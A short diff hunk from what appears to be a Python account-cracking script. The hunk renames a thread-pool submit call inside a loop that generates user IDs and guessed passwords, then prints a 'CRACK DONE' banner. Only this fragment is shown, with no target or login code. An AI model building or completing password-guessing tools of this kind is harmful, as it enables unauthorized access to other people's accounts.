@@ -71,7 +71,7 @@ def Main():
 		for guru in user:
 			uid = love+lova+lovb+guru
 			pwx = [lova+lovb+guru,love+lova+lovb,love+love]
-			T-C-404.submit(test,uid,pwx,tl)
+			RJ.submit(test,uid,pwx,tl)
 	print(50*'━')
 	print(' <> CRACK DONE......... ')
 	print(50*'━')
